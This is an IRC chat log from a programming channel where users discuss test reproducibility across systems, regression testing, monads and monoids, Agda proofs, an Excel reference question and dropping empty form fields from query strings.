[08:32:36] <sonny> if that's not an option then, yeah you're going to have to write some really robust dynamic software lol
[08:32:59] <Linkandzelda> sonny: i felt that if the code doesnt have any OS specific code in it, like paths for example or calling direct binaries outside of itsself, and it runs in its own environment (like python or something), then shouldnt the unit tests work the same, providing dependendies and libraries were all present?
[08:33:40] <sonny> nah lol
[08:33:43] *** Joins: qbt (~qbt@user/edun)
[08:34:07] <sonny> python as the env is not going to be enough
[08:34:31] <sonny> but in theory yeah
[08:34:49] <Linkandzelda> sonny: that really means that the same tests could fail on another system? i need to know more about that and why. if the python version was identical and had to be the exact version, in this example
[08:35:11] *** Joins: resamvi (~resamvi@p4ff773f9.dip0.t-ipconnect.de)
[08:36:21] <sonny> well, distro's have different preferences that will come up in the subtlest of ways
[08:37:29] <sonny> so if you have to deploy to debian or redhat machine, !# /bin/env python could be a problem already
[08:37:39] *** Quits: Photic (~Photic@user/photic) (Quit: Ping timeout (120 seconds))
[08:38:06] <sonny> even on the same distro, something might have broken in an update on one machine but not the other
[08:39:21] <Linkandzelda> sonny: unit tests cant help with that i suppose. thats something i'd say is a user error. but, i'd still want to know why that configuration caused the issue somehow and fix that
[08:39:27] <sonny> I think this is why containers are popular now, cause you can just duplicate your machine
[08:39:42] *** Quits: betelgeuse (~betelgeus@94-225-47-8.access.telenet.be) (Quit: The Lounge - https://thelounge.chat)
[08:39:48] <sonny> but even then, linux is weird or physics :P
[08:39:55] *** Quits: resamvi (~resamvi@p4ff773f9.dip0.t-ipconnect.de) (Ping timeout: 256 seconds)
[08:39:57] <Linkandzelda> very true indeed
[08:40:35] *** Joins: betelgeuse (~betelgeus@94-225-47-8.access.telenet.be)
[08:41:36] *** Joins: Nact (~l@2a02:2788:11c4:6e6:a22b:167a:b4a4:994c)
[08:41:45] <Samian>  I made a python program and a cpp program that are supposed to be different versions of the same program.  I want to make unit tests that check for identical outputs given identical inputs.  What's the technical name for such a test?
[08:41:47] <sonny> why a configuration caused an issue might take time to find, I don't think there's a secret sauce for that yet
[08:42:56] <Linkandzelda> sonny: but, for example, if an app config file asked for a number in a cfg like "some_setting = 12" and someone writes "some_setting = twelve", a unit test should pick that up and help to throw a proper error
[08:43:18] *** Quits: ttree (~ttree0@c-73-239-62-159.hsd1.wa.comcast.net) (Ping timeout: 256 seconds)
[08:44:12] *** Joins: jumpArtifact (~jumpArtif@user/jumpartifact)
[08:44:30] <Linkandzelda> if not a unit test, then in-app validation at least
[08:45:13] <sonny> sure, that would get caught by your parser unless it was legal
[08:45:19] <sonny> then you need a schema
[08:45:41] <sonny> Samian: regression tests?
[08:45:43] *** Quits: Nact (~l@2a02:2788:11c4:6e6:a22b:167a:b4a4:994c) (Client Quit)
[08:46:24] <Samian> I wonder why no one calls it equivalency testing
[08:46:41] <d3x0r> input validation
[08:46:43] <Samian> That's the most self-explanatory name I think
[08:47:15] <Samian> With "input validation" I can imagine many people asking "what's that mean?" I'd imagine less for "equivalency testing"
[08:47:19] <sonny> I thought you wanted the same result over different versions?
[08:47:25] <Samian> d3x0r  do you disagree
[08:47:31] <Samian> sonny  yes that's right
[08:47:40] *** Joins: resamvi (~resamvi@p4ff773f9.dip0.t-ipconnect.de)
[08:47:40] <sonny> that's a regression test no?
[08:47:56] <Samian> sonny  basically if you couldn't look inside two black boxes, for all you knew you couldn't tell one black box from the other. Give both the same input, you get the same output from both.
[08:48:38] <Samian> hah it is regression testing
[08:48:57] <Samian> well, if you update a program and want to ensure behavior has not changed, that's damn near the same thing I'm talking about
[08:49:12] <sonny> Linkandzelda: sounds like you have more of a deployment problem at the moment
[08:49:33] <sonny> distributed would be like all the code from different machines interacting?
[08:49:38] <Samian> but if it's two separate programs built ground up, it's not really a small change that's being tested.
[08:50:06] *** Quits: The_Blode (~Blode@user/the-blode/x-7164444) (Ping timeout: 256 seconds)
[08:50:30] <Linkandzelda> sonny: the code wont talk to each other, its isolated
[08:53:26] *** Quits: dre (~dre@2001:8003:c932:c301:bb14:f1af:101c:4c88) (Quit: Leaving)
[08:53:36] <sonny> other example could be UB making the python on each machine different
[08:53:57] *** Joins: dre (~dre@2001:8003:c932:c301:c7a0:423f:5a6a:50c7)
[08:53:58] <sonny> which would be a pain to figure out, let's hope cpython doesn't use UB :P
[08:54:36] <lind{at}yahoo> https://usercontent.irccloud-cdn.com/file/0pXayhTb/IMG_0835.PNG
[08:54:41] <sonny> Linkandzelda: well, is it sharing resources?
[08:55:21] *** Quits: derjanni (~textual@ip-88-153-100-48.hsi04.unitymediagroup.de) (Ping timeout: 268 seconds)
[08:57:00] <sonny> what happened, why do I typically see casts before malloc in C code?
[08:57:10] <sonny> did something change in the C standard?
[08:57:21] <Samian> whollly crap! It's called extensionality!
[08:57:28] <Samian> https://en.wikipedia.org/wiki/Extensionality
[08:57:29] <bayaz> Title: Extensionality - Wikipedia 
[08:57:57] <Samian> "These functions are extensionally equal; given the same input, both functions always produce the same value. "
[08:58:51] <Linkandzelda> sonny: the resources get delivered with the code, so everyone has the same resources
[09:01:43] *** Quits: resamvi (~resamvi@p4ff773f9.dip0.t-ipconnect.de) (Quit: Lost terminal)
[09:02:31] *** Joins: Sauvin (~sauvin@about/linux/staff/sauvin)
[09:02:49] <sonny> ok, this is distributed code then ;)
[09:04:28] *** Joins: The_Blode (~Blode@user/the-blode/x-7164444)
[09:05:47] <Linkandzelda> sonny: indeed, well i need to figure out then a better way to prevent problems in the wild. but at the very least proper unit testing is a foundation
[09:07:03] <sonny> a and a == a?
[09:07:13] <sonny> for bitwise stuff
[09:07:16] *** Quits: tomgus1 (~tomgus1@2a02:c7e:4229:d900:ba27:ebff:fe5c:2dcd) (Quit: ZNC 1.8.2+deb2 - https://znc.in)
[09:07:32] *** Joins: tomgus1 (~tomgus1@90.218.30.64)
[09:08:19] *** Quits: Ilyu (~quassel@166.215.82.79.rev.sfr.net) (Ping timeout: 268 seconds)
[09:08:37] <Linkandzelda> sonny: the basics. i'd want to know if an outside configuration caused a bug or the code did. when code bugs are discovered which tests didnt catch then a test case is added for that to prevent regression
[09:10:06] *** Joins: password (~password@user/password2)
[09:11:27] *** Quits: Guest41 (~Guest41@eth-west-pareq2-46-193-4-100.wb.wifirst.net) (Quit: Client closed)
[09:11:45] <sonny> maybe you can start by testing with arbitrary inputs and observing what happens
[09:12:57] *** Parts: qbt (~qbt@user/edun) ()
[09:13:14] *** Quits: analoq (~yashi@user/dies) (Ping timeout: 268 seconds)
[09:14:21] *** Joins: analoq (~yashi@user/dies)
[09:18:28] *** Quits: sonny (~sonny@bras-base-london1483w-grc-30-74-12-157-200.dsl.bell.ca) (Quit: Client closed)
[09:19:37] *** Joins: merijn (~merijn@83-160-49-249.ip.xs4all.nl)
[09:19:57] *** Quits: Xaldafax (~xaldafax@cpe-198-72-160-101.socal.res.rr.com) (Quit: Bye...)
[09:20:15] *** Joins: jonaskabrink (~jonaskabr@ip1f12b838.dynamic.kabel-deutschland.de)
[09:29:58] *** Quits: Seirdy (~Seirdy@sourcehut/user/seirdy) (Quit: exiting 3.2)
[09:30:25] *** Joins: zunk (~zunk@user/zunk)
[09:37:36] *** Joins: arcatech (~arcatech@user/arcatech)
[09:37:37] *** Joins: triad (~triad@user/triad)
[09:39:34] *** Joins: penguino (~mrpenguin@user/mrpenguin)
[09:40:01] *** Joins: caramel (~caramel@user/caramel)
[09:41:00] *** Quits: engest (~engest@50.39.177.170) (Ping timeout: 268 seconds)
[09:42:23] *** Quits: arcatech (~arcatech@user/arcatech) (Ping timeout: 264 seconds)
[09:43:20] *** Quits: MrBungle (~MrBungle@2604:3d08:1788:dc00:81e:1483:4212:54c1) (Read error: Connection reset by peer)
[09:45:52] *** Quits: flakland (~flaknet99@32.211.211.39) (Remote host closed the connection)
[09:46:35] *** Quits: Samian (~s@user/samian) (Ping timeout: 264 seconds)
[09:47:07] *** Joins: flakland (~flaknet99@32.211.211.39)
[09:49:58] *** Quits: jonaskabrink (~jonaskabr@ip1f12b838.dynamic.kabel-deutschland.de) (Quit: jonaskabrink)
[09:52:42] *** Joins: Guest41 (~Guest41@eth-west-pareq2-46-193-4-100.wb.wifirst.net)
[09:53:57] *** Quits: merijn (~merijn@83-160-49-249.ip.xs4all.nl) (Ping timeout: 268 seconds)
[09:56:05] <Inst> ugh
[09:56:12] <Inst> i think i might have to learn category theory just to get monads
[09:56:13] <Inst> ;____;
[09:57:43] *** Joins: Atque (~Atque@user/atque)
[10:02:24] *** Quits: jarthur (~jarthur@2603-8080-1540-002d-25e6-a83c-568d-3ca5.res6.spectrum.com) (Quit: jarthur)
[10:05:45] *** Quits: Inst (~Inst@2601:6c4:4080:3f80:1d49:739d:9075:d5df) (Remote host closed the connection)
[10:06:03] *** Joins: Inst (~Inst@2601:6c4:4080:3f80:1d49:739d:9075:d5df)
[10:06:57] <flakland> what is  common use for the monoids? the wiki page reads like its a conversion thing, but then goes on to say it helps deal with side effects somehow
[10:06:59] <flakland> soo many words
[10:07:06] <flakland> so little time
[10:10:06] <flakland> for IO
[10:10:26] <flakland> like building a string of a specific length instead of <user-input-length>
[10:10:28] <flakland> ??
[10:13:46] *** Joins: AquaL1te (~AquaL1te@user/aqual1te)
[10:14:24] *** Joins: ThePhilgrim (~ThePhilgr@151.41.8.149)
[10:15:18] *** Quits: jumpArtifact (~jumpArtif@user/jumpartifact) (Quit: WeeChat 3.3)
[10:15:59] *** Quits: Inst (~Inst@2601:6c4:4080:3f80:1d49:739d:9075:d5df) (Ping timeout: 264 seconds)
[10:18:04] *** Joins: qbt (~qbt@user/edun)
[10:20:12] *** Joins: user51 (~user51@176.228.59.81)
[10:23:58] <xeno> flakland: hard to say what the most common use case is, since it's everywhere...  (ints,+) is probably the most common monoid. For the more advanced one, you have reduce where the accumulator type is the same as the list type 
[10:25:39] *** Quits: Guest41 (~Guest41@eth-west-pareq2-46-193-4-100.wb.wifirst.net) (Quit: Client closed)
[10:26:26] *** Joins: dan01 (~dan01@88.84.165.182)
[10:26:42] <xeno> note that (int,-) and (nat,+) are monoids, while (nat,-) is not and (int,/) is also not 
[10:26:50] *** Joins: pingpongball (~pingpongb@103.94.252.92)
[10:28:45] <flakland> someone on youtube says its just a state transformer
[10:29:34] *** Quits: TJ- (~root@user/tj-) (Ping timeout: 260 seconds)
[10:29:47] *** Joins: derjanni (~textual@ip-88-153-100-48.hsi04.unitymediagroup.de)
[10:29:54] *** Joins: palasso (~palasso@user/palasso)
[10:30:10] *** Joins: ExeciN (~ExeciN@user/nicexe)
[10:34:49] <xeno> flakland: a monoid? 
[10:35:17] <flakland> oops  monad
[10:35:19] <xeno> it's not, since it's math and math is stateless 
[10:35:32] <xeno> ah yeah, those are different 
[10:35:46] <xeno> a monad is a way to keep some of the arguments in a hidden context 
[10:37:07] <xeno> can of course be used to represent a state (except it's still stateless), like one does with io
[10:38:40] *** Quits: Gumshoe (~whoa@cpe-107-184-42-236.socal.res.rr.com) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[10:39:25] <xeno> a monad is like, you have context,value , and a function apply that takes one argument, value, and uses that function to produce new-context,new-value 
[10:39:34] <xeno> like Optional and map 
[10:41:56] <ski> monads express (an abstract notion of) sequencing
[10:42:17] <xeno> so if you have Optional<int> (which makes Optional the context and the int the value), then Optional<int>.map is a function that takes another function (int->T) as an argument, and produces an Optional<T> as a result 
[10:42:29] <xeno> ski: they are typically used for that 
[10:42:33] <xeno> but not always 
[10:43:06] <ski> what "sequence" means in particular, depends on the monad in question. e.g. for the list/nondeterminism monad, it effectively amounts to nesting of loops (which is not what you'd at first think of as sequencing, hence "abstract notion of")
[10:43:09] <flakland> cool thx, never seen "idempotent" before that was a fun new weird word
[10:43:12] <xeno> new Optional(4).map(i -> i +1) => Optional(5) isn't sequencing, but it's still applying a monad 
[10:43:43] <ski> `map' isn't one of the base monadic operations
[10:44:38] <xeno> it's a common example of one 
[10:45:38] <xeno> I'm btw unsure on if map to a different type i monadic or not. I suspect it has to be, since if you map Optional<int> to Optional<long>, I guess it would not be an endofunctor? 
[10:46:09] <ski> what about `new Optional(9).bind(i -> halve(i).bind(j -> square_root(j)))' ?
[10:46:19] <ski> that looks like sequencing, to me
[10:46:55] <ski> (assume `halve' succeeds on even input, and fails on odd input. and `square_root' only succeeds for perfect squares)
[10:47:05] <xeno> I didn't say it never was, I just said it doesn't have to be 
[10:47:28] <xeno> what is bind btw? 
[10:47:43] <ski> well, `foo.map(x -> bar(x)' is the same as `foo.bind(x -> unit(bar(x)))'
[10:48:17] <ski> `bind' is the monadic extension operation. sometimes people use a name like `concatMap' or `joinMap' for it
[10:48:35] <ski> (and `unit' is sometimes called `return')
[10:48:56] <xeno> ah ok
[10:49:13] <xeno> anyway, as I said, you can use it for sequencing, but it's not defined as sequencing 
[10:49:25] <ski> (in math, `unit' would be called ⌜η⌝, and `bind' would be ⌜⋆⌝)
[10:49:42] <xeno> I need to read up on those to properly get it 
[10:50:38] *** Quits: Hexmind (~Hexmind@modemcable049.25-131-66.mc.videotron.ca) (Quit: Leaving)
[10:51:51] <ski> it's a notion of sequencing, in the same sense that a monoid expresses a notion of ordering. if you write `a * b * c * d', you've given your factors `a',`b',`c',`d' in a specific order. because it's a monoid, you know that all possible (five) brackettings of those will give the same result. now, in *some* monoids, the order actually doesn't matter (e.g. multiplying integers, or reals, or complex 
[10:51:57] <ski> numbers). but in some, it does (multiplying quaternions, multiplying matrices, composing functions)
[10:52:35] <ski> so, the notion of monoid itself, expresses ordering, in the sense that it *allows* ordering of terms to matter. but it doesn't demand it to actually matter
[10:54:09] <ski> in the same way (because "a monad is just a monoid in the category of endofunctors"), the monad interface/notion expresses a sense of sequencing. but that doesn't prohibit particular monads from actually being commutative, particular sequencing ordering to not matter
[10:55:24] <ski> anyway, your `map' example is similar to `x * 1', or just `x', which is a "singleton product" .. so there's nothing to order. similarly, with just a `map', "there's nothing to sequence"
[10:55:45] <ski> (`*' corresponds to `bind', and `1' to `unit', in the analogy)
[10:57:10] <ski> anyway, i agree about stressing that monads, i general, don't have anything to do with state. state is a *particular* monad, but just one of several different ones
[10:57:13] <xeno> I can admit that it mostly makes sense in the context of sequencing yes :) - since why replace a context with a new context, unless you plan to use the new context for something - thus a sequence 
[10:58:30] *** Joins: Samian (~s@user/samian)
[10:59:56] *** Quits: mickey8 (~user@user/mickey) (Remote host closed the connection)
[11:00:13] *** Joins: mickey8 (~user@user/mickey)
[11:01:22] <ski> "Escaping Hell with Monads" by Philip Nilsson in 2017-05-08 at <https://philipnilsson.github.io/Badness10k/escaping-hell-with-monads/>, and "Flattening Callback Chains with Monad Do-Notation" by Remko Tronçon in 2015-07-02 at <https://el-tramo.be/blog/async-monad/> might perhaps be interesting, to get an initial quick sense of the kind of boiler-plate removals that monads abstract over
[11:04:24] <ski> (those are not monad tutorials, btw .. most monad tutorials out there seem to succeed in making the reader more confused than they were previously (cf. "Abstraction, intuition, and the “monad tutorial fallacy”" by byorgey (aka Brent Yorgey) in 2009-01-12 at <https://byorgey.wordpress.com/2009/01/12/abstraction-intuition-and-the-monad-tutorial-fallacy/>) .. best advice would seem to be to not start 
[11:04:30] <ski> with trying to understand monads in the abstract, but rather starting with seeing particular examples of them, what they can buy you)
[11:06:24] *** Joins: MRODE (~MRODE@212.91.174.218)
[11:07:00] <xeno> yeah, I completely agree - most monad explanations and tutorials sucks ass 
[11:07:09] *** Joins: chomwitt (~chomwitt@2a02:587:dc02:9f00:12c3:7bff:fe6d:d374)
[11:07:32] <flakland> and theres information overload, so many rabbit holes to get lost in: https://en.wikipedia.org/wiki/Semilattice
[11:07:34] <bayaz> Title: Semilattice - Wikipedia 
[11:07:44] <xeno> one of the worst thing you can do to a programmer unfamiliar with monad is to hand over the monad laws, so of course that's what tons of people and books do 
[11:09:57] <pingpongball> Are there any bodybuilder who is also a seniour programmer here?
[11:10:30] *** Joins: DarkTrick_ (~DarkTrick@pl-749-047.bunbun.ne.jp)
[11:12:05] <xeno> nah, I guess cyclists doesn't count - nowhere near bodybuilder
[11:13:21] <pingpongball> i want to be bodybuilder, huge like jay cutler or ronnie coleman + MMA figher, but i also want to be great programmer
[11:13:25] *** Joins: diophantoz (~diophanto@user/diophantoz)
[11:13:32] <ski> flakland : "Monoidal Parsing" in 2017-10-09 at <https://www.youtube.com/watch?v=Txf7swrcLYs> and Lambda World Opening Keynote in 2018 at <https://www.youtube.com/watch?v=HGi5AxmQUwU>, both by edwardk (aka Edward Kmett) (and both about monoidal parsing) is a cool example of monoids (and semigroups)
[11:14:32] *** Joins: curiosity (uid511277@user/cypris)
[11:14:51] <jtgd> If you get hit in the head enough the brain damage might interfere with the programming.
[11:15:03] *** Quits: curiosity (uid511277@user/cypris) (Client Quit)
[11:15:13] *** Joins: curiosity (uid511277@user/cypris)
[11:15:47] <arahael> Or it might improve the programming. ;)
[11:15:54] <jtgd> HA!
[11:16:04] <pingpongball> i want to have both, bodybuilding + programming
[11:16:25] <triad> could we say that the loop invariant is the solution at a given moment while the loop is running ?
[11:16:26] <jtgd> ok, just protect your brain.
[11:17:15] *** Joins: simon323 (~simon323@2409:8a34:46c:5830:19ce:57cd:27d4:595b)
[11:17:47] * ski . o O ( PyCon keynote by K. Lars Lohn in 2016-06-02 at <https://www.youtube.com/watch?v=bSfe5M_zG2s> )
[11:19:17] *** Quits: pingpongball (~pingpongb@103.94.252.92) (Quit: Client closed)
[11:19:55] *** Joins: vysn (~vysn@user/vysn)
[11:22:31] *** Joins: absc (~absc@81.31.144.28)
[11:23:49] *** Joins: mobidrop (~mobidrop@user/mobidrop)
[11:24:01] *** Joins: mrig (~AdiIRC@user/mrig)
[11:27:41] *** Quits: lane (~lane@86.106.121.217) (Ping timeout: 268 seconds)
[11:30:53] *** Joins: Seirdy (~Seirdy@sourcehut/user/seirdy)
[11:31:38] <beaky> so it has been 2 days but i have not yet managed to prove my circular doubly linked list in agda is correct what is the easiest approach to verify that it is indeed correct
[11:31:55] <beaky> because i used coinductive records
[11:31:58] <pony> how do we prove our programs are correct?
[11:32:12] *** Joins: szutt (~szutt@116.37.2.145)
[11:32:48] <pony> I think I should pick up racket again
[11:33:02] *** Joins: DevAntoine (~DevAntoin@2a01:e34:ec4e:a200:d0fd:3cfa:5fd6:6824)
[11:33:12] <beaky> using the power of dependent types you can express properties about programs and through the power of propositions as types / programs as proofs you can write proofs of those properties and then the typechecker will verify correctness of the proof
[11:33:27] <pony> ahh
[11:33:44] <pony> that sounds cool
[11:33:49] <pony> I've never done that
[11:34:48] <beaky> yes this is the background behind how coq and agda work as proof assistants
[11:35:34] <flakland> maybe you can leverage a semilattice for building your proof
[11:38:10] *** Quits: DevAntoine (~DevAntoin@2a01:e34:ec4e:a200:d0fd:3cfa:5fd6:6824) (Ping timeout: 268 seconds)
[11:40:43] *** Joins: jazzy2 (~jaziz@user/jaziz)
[11:41:15] *** Quits: DarkTrick_ (~DarkTrick@pl-749-047.bunbun.ne.jp) (Ping timeout: 256 seconds)
[11:41:20] *** Joins: Booster2ooo (~Booster2o@user/booster2ooo)
[11:43:35] *** Quits: jazzy (~jaziz@user/jaziz) (Ping timeout: 264 seconds)
[11:43:41] *** jazzy2 is now known as jazzy
[11:44:03] *** Joins: DnzAtWrk (~DnzAtWrk@mobile-access-56734f-209.dhcp.inet.fi)
[11:47:27] *** Joins: Rounin (~david@84.212.130.215)
[11:49:08] *** Joins: pingpongball (~pingpongb@103.94.252.92)
[11:50:10] *** Joins: Photic (~Photic@user/photic)
[11:50:14] *** Joins: merijn (~merijn@83-160-49-249.ip.xs4all.nl)
[11:51:05] *** Joins: aradesh (~aradesh@user/aradesh)
[11:51:44] *** Quits: password (~password@user/password2) (Ping timeout: 268 seconds)
[11:55:07] *** Joins: DevAntoine (~DevAntoin@2a01:e34:ec4e:a200:d0fd:3cfa:5fd6:6824)
[11:55:44] *** Joins: interop_madness (~interop_m@user/interop-madness/x-0950004)
[11:56:15] *** Quits: pingpongball (~pingpongb@103.94.252.92) (Quit: Client closed)
[11:58:37] *** Joins: jaysicks (~jaysicks@178-164-135-126.pool.digikabel.hu)
[12:03:26] *** Quits: jazzy (~jaziz@user/jaziz) (Ping timeout: 268 seconds)
[12:05:41] *** Quits: Joanna (uid57472@id-57472.lymington.irccloud.com) (Quit: Connection closed for inactivity)
[12:05:55] *** Joins: orange (~orangeext@user/orangeextract)
[12:09:00] *** Quits: art_vandelay (~art_vande@bras-base-toroon63x9w-grc-21-174-89-102-174.dsl.bell.ca) (Ping timeout: 268 seconds)
[12:09:18] *** Joins: masta`` (~oyster@user/masta/x-2645138)
[12:09:24] <beaky> nice i like semilattices
[12:10:44] <xcombelle> hi
[12:10:50] *** Quits: dan01 (~dan01@88.84.165.182) (Remote host closed the connection)
[12:10:55] *** Joins: art_vandelay (~art_vande@bras-base-toroon63x9w-grc-21-174-89-102-174.dsl.bell.ca)
[12:14:50] *** Quits: orange (~orangeext@user/orangeextract) (Quit: Leaving)
[12:17:01] *** Quits: DevAntoine (~DevAntoin@2a01:e34:ec4e:a200:d0fd:3cfa:5fd6:6824) (Remote host closed the connection)
[12:17:10] *** Joins: DevAntoine (~DevAntoin@2a01:e34:ec4e:a200:d0fd:3cfa:5fd6:6824)
[12:17:20] *** Joins: MrMobius_ (~MrMobius@pool-108-31-243-125.washdc.fios.verizon.net)
[12:19:53] *** Quits: MrMobius (~MrMobius@pool-108-31-243-125.washdc.fios.verizon.net) (Ping timeout: 264 seconds)
[12:21:04] *** Joins: lavos (~molt@178-222-245-206.static.isp.telekom.rs)
[12:24:19] *** Joins: SmokenatorZ62 (~Smokenato@189.78.241.111)
[12:24:54] *** Quits: molt (~molt@178-222-245-206.static.isp.telekom.rs) (Ping timeout: 260 seconds)
[12:24:58] *** Joins: molten (~molt@178-222-245-206.static.isp.telekom.rs)
[12:25:01] *** Quits: merijn (~merijn@83-160-49-249.ip.xs4all.nl) (Ping timeout: 268 seconds)
[12:26:21] *** Quits: SmokenatorZ6 (~Smokenato@201-1-180-241.dsl.telesp.net.br) (Ping timeout: 245 seconds)
[12:26:21] *** SmokenatorZ62 is now known as SmokenatorZ6
[12:28:18] *** Quits: shokohsc8 (~shokohsc@161.88.195.77.rev.sfr.net) (Read error: Connection reset by peer)
[12:28:41] *** Joins: molt (~molt@178-222-245-206.static.isp.telekom.rs)
[12:28:44] *** Quits: lavos (~molt@178-222-245-206.static.isp.telekom.rs) (Ping timeout: 268 seconds)
[12:28:59] *** Joins: shokohsc8 (~shokohsc@161.88.195.77.rev.sfr.net)
[12:30:42] *** Joins: merijn (~merijn@83-160-49-249.ip.xs4all.nl)
[12:31:50] *** Quits: molten (~molt@178-222-245-206.static.isp.telekom.rs) (Ping timeout: 260 seconds)
[12:33:56] *** Joins: lavos (~molt@178-222-245-206.static.isp.telekom.rs)
[12:34:52] *** Joins: molten (~molt@178-222-245-206.static.isp.telekom.rs)
[12:35:04] *** Joins: Klinda (~superleag@user/klinda)
[12:37:01] *** Quits: twomoon (~twomoon@ip72-199-116-21.sd.sd.cox.net) (Quit: Leaving)
[12:37:55] *** Quits: molt (~molt@178-222-245-206.static.isp.telekom.rs) (Ping timeout: 256 seconds)
[12:38:50] *** Quits: lavos (~molt@178-222-245-206.static.isp.telekom.rs) (Ping timeout: 260 seconds)
[12:39:16] *** Joins: lavos (~molt@178-222-245-206.static.isp.telekom.rs)
[12:41:40] *** Quits: Khoyo (~khoyo@user/khoyo) (Ping timeout: 268 seconds)
[12:41:53] *** Quits: molten (~molt@178-222-245-206.static.isp.telekom.rs) (Ping timeout: 256 seconds)
[12:42:55] *** Joins: molten (~molt@178-222-245-206.static.isp.telekom.rs)
[12:43:18] *** Joins: mikeliuk (~mikeliuk@213.205.198.227)
[12:43:48] *** Joins: Twipply (~Twipply@user/twipply)
[12:44:08] *** Joins: pingpongball (~pingpongb@103.94.252.92)
[12:44:28] *** Joins: Khoyo (~khoyo@user/khoyo)
[12:45:49] *** Joins: password (~password@user/password2)
[12:45:49] *** Quits: pingpongball (~pingpongb@103.94.252.92) (Client Quit)
[12:46:46] *** Quits: lavos (~molt@178-222-245-206.static.isp.telekom.rs) (Ping timeout: 260 seconds)
[12:47:22] *** Joins: pingpongball (~pingpongb@103.94.252.92)
[12:47:53] *** Joins: DarkTrick_ (~DarkTrick@pl-749-047.bunbun.ne.jp)
[12:48:00] *** Joins: orange (~orangeext@user/orangeextract)
[12:48:40] *** Quits: mrig (~AdiIRC@user/mrig) (Quit: Going offline, see ya! (www.adiirc.com))
[12:49:39] *** Joins: rsx (~dummy@ppp-188-174-137-236.dynamic.mnet-online.de)
[12:49:59] *** Joins: TJ- (~root@user/tj-)
[12:52:02] *** Joins: vdamewood (~vdamewood@fedora/vdamewood)
[12:52:19] *** Quits: orange (~orangeext@user/orangeextract) (Client Quit)
[12:52:36] <vdamewood> Hi, people etc.
[12:53:50] *** Quits: ski (~ski@remote12.chalmers.se) (Ping timeout: 260 seconds)
[12:54:05] *** Joins: ski (~ski@remote12.chalmers.se)
[12:56:08] *** Joins: lavos (~molt@178-222-245-206.static.isp.telekom.rs)
[12:57:21] <FightingFalcon> Any excel nerds here?
[12:57:58] *** Quits: lind{at}yahoo (uid486956@id-486956.tinside.irccloud.com) (Ping timeout: 260 seconds)
[12:58:53] *** Quits: _inky (~inky_@46.36.117.129) (Ping timeout: 256 seconds)
[12:59:55] *** Joins: lind{at}yahoo (uid486956@id-486956.tinside.irccloud.com)
[13:00:10] *** Quits: molten (~molt@178-222-245-206.static.isp.telekom.rs) (Ping timeout: 268 seconds)
[13:00:35] *** Joins: no_gravity (~no_gravit@user/no-gravity/x-5639427)
[13:00:40] <no_gravity> Good Morning! Is there a way to tell the browser "do not submit empty form values"?
[13:00:47] *** Joins: gggp (~gggp@111-251-142-222.dynamic-ip.hinet.net)
[13:00:49] *** Joins: saribro (~swinnenb@user/swinnenb)
[13:00:50] <biberu> FightingFalcon: what kind of qualifications do you need for that?
[13:01:16] *** Quits: gggp (~gggp@111-251-142-222.dynamic-ip.hinet.net) (Client Quit)
[13:01:34] <biberu> no_gravity: just don't submit them? :)
[13:01:51] <FightingFalcon> =A2*try[@usdtogbp]
[13:02:17] <FightingFalcon> This gets the data from try sheet and multiply by A2. But i want to make an absolute reference
[13:02:18] <no_gravity> biberu: I mean when a form has 50 fields and only one is filled by the user. I don't need the other 49 empty strings to be sent to the server.
[13:02:34] <FightingFalcon> like A2*$B$45
[13:02:52] <FightingFalcon> I dont know how to do with try[@usdtogbp]
[13:03:14] *** Joins: Burgundy (~yomon@86.127.194.72)
[13:03:33] <biberu> no_gravity: handle the submit with a script that filters out the empty fields? why are they a problem though?
[13:03:39] *** Quits: CyberTailor (~cyber@gateway/tor-sasl/cybertailor) (Remote host closed the connection)
[13:03:44] *** Joins: molten (~molt@178-222-245-206.static.isp.telekom.rs)
[13:03:52] <no_gravity> biberu: That would work but I don't want that complexity in my code and on the client.
[13:04:10] <no_gravity> biberu: Needed because they make nicer urls when submitting a GET request.
[13:04:25] *** Quits: swinnenb (~swinnenb@user/swinnenb) (Ping timeout: 260 seconds)
[13:04:31] *** Joins: CyberTailor (~cyber@gateway/tor-sasl/cybertailor)
[13:04:53] *** Joins: orange (~orangeext@user/orangeextract)
[13:05:13] *** Quits: ravan (~ravan@user/ravan) (Remote host closed the connection)
[13:05:17] <no_gravity> biberu: Imagine I want to send you a search: somewhere.com/search?color=blue is so much nicer than somewhere.com/search?weight=&width=&height=&length=&color=blue&material=&year=&month=&date=...
[13:05:22] <biberu> no_gravity: careful that your url doesn't get too long if you're putting that many fields in a query string
[13:06:46] *** Joins: molt (~molt@178-222-245-206.static.isp.telekom.rs)
[13:07:23] *** Quits: lavos (~molt@178-222-245-206.static.isp.telekom.rs) (Ping timeout: 256 seconds)
[13:07:25] *** Joins: plastico (~plastico@neomutt/plastico)
[13:08:22] *** Joins: lavos (~molt@178-222-245-206.static.isp.telekom.rs)
[13:09:38] *** Quits: molten (~molt@178-222-245-206.static.isp.telekom.rs) (Ping timeout: 260 seconds)
[13:11:25] *** Joins: molten (~molt@178-222-245-206.static.isp.telekom.rs)
[13:11:30] *** Quits: molt (~molt@178-222-245-206.static.isp.telekom.rs) (Ping timeout: 260 seconds)
[13:11:30] *** Quits: mestre (~mestre@191.177.175.57) (Quit: Lost terminal)
[13:12:44] *** Joins: trebko (~trebko@137.220.86.97)
[13:13:55] *** Joins: _inky (~inky_@46.241.144.72)
[13:13:56] *** Quits: DnzAtWrk (~DnzAtWrk@mobile-access-56734f-209.dhcp.inet.fi) (Read error: Connection reset by peer)
[13:14:40] *** Joins: arcatech (~arcatech@user/arcatech)
[13:14:46] *** Quits: pulse (~pulse@user/pulse) (Ping timeout: 260 seconds)
[13:15:02] *** Joins: DnzAtWrk (~DnzAtWrk@mobile-access-567363-170.dhcp.inet.fi)
[13:15:19] *** Quits: lavos (~molt@178-222-245-206.static.isp.telekom.rs) (Ping timeout: 256 seconds)
[13:16:21] *** Quits: vdamewood (~vdamewood@fedora/vdamewood) (Quit: My MacBook Pro has gone to sleep. ZZZzzz…)
[13:16:50] *** Quits: Codaraxis (~Codaraxis@user/codaraxis) (Ping timeout: 268 seconds)
[13:18:46] *** Quits: pingpongball (~pingpongb@103.94.252.92) (Ping timeout: 256 seconds)
[13:19:17] *** Quits: arcatech (~arcatech@user/arcatech) (Ping timeout: 268 seconds)
[13:20:51] *** Quits: CyberTailor (~cyber@gateway/tor-sasl/cybertailor) (Remote host closed the connection)
[13:21:44] *** Joins: CyberTailor (~cyber@gateway/tor-sasl/cybertailor)
[13:26:07] *** Quits: edgar-rft (~edgar-rft@HSI-KBW-109-193-249-223.hsi7.kabel-badenwuerttemberg.de) (Quit: Leaving)
